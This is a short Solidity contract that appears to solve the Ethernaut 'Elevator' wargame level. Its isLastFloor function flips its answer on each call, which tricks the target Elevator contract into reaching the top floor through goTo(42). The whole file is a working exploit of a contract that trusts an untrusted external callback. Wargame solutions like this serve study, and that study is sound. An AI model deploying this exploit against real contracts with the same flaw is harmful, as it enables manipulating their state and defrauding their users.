// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Building {
    Elevator elevator;
    bool isTopFloor = false;

    constructor(address _elevator) {
       elevator = Elevator(_elevator); 
    }

    function attack() public {
        elevator.goTo(42);
    }
     
    function isLastFloor(uint _floor) external returns (bool) {
        bool tempSwtich = isTopFloor; 
        isTopFloor = !isTopFloor;
        return tempSwtich;
    }
}

interface Elevator {
    function goTo(uint _foor) external;
}
